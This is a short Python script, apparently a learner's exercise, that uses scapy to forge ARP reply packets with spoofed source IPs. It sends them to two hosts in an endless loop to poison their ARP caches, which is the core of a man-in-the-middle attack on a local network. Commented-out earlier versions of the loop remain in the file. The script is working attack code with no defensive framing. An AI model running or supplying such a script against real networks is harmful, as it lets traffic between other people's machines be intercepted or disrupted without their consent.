#! /usr/bin/env python3

import scapy.all as scapy
import time
import sys

packet = scapy.ARP(op=2, pdst="10.11.12.108", hwdst="94-54-1B-5A-C2-3D", psrc="192.168.81.2")
packet1 = scapy.ARP(op=2, pdst="192.168.81.2", hwdst="00:50:56:f2:9a:fc", psrc="192.168.81.143")
sent_packets_count = 0
# while True:
#     scapy.send(packet)
#     scapy.send(packet1)
#     sent_packets_count += 2
#     print("[+] Packet sent" + str(sent_packets_count))
#     time.sleep(20)ipy
#     break

# sent_packets_count = 0
# while True:
#     scapy.send(packet, verbose=False)
#     scapy.send(packet1, verbose=False)
#     sent_packets_count += 2
#     print("\r[+] Packet sent: " + str(sent_packets_count), end="")
#     #sys.stdout.flush() this only work in python2. but with adding the above end="" it says don't pring any
#     #hing at the end of line start.
#     time.sleep(2)

try:
    while True:
        scapy.send(packet, verbose=False)
        scapy.send(packet1, verbose=False)
        sent_packets_count += 2
        print("\r[+] Packet sent: " + str(sent_packets_count), end="")
        #sys.stdout.flush() this only work in python2. but with adding the above end="" it says don't pring any
        #hing at the end of line start.
        time.sleep(2)
except KeyboardInterrupt:
    print(" [+] Detected CTR +C ........ Quitting.")












#scapy.ls(scapy.ARP())
#print(packet.show())
##print(packet.summary())

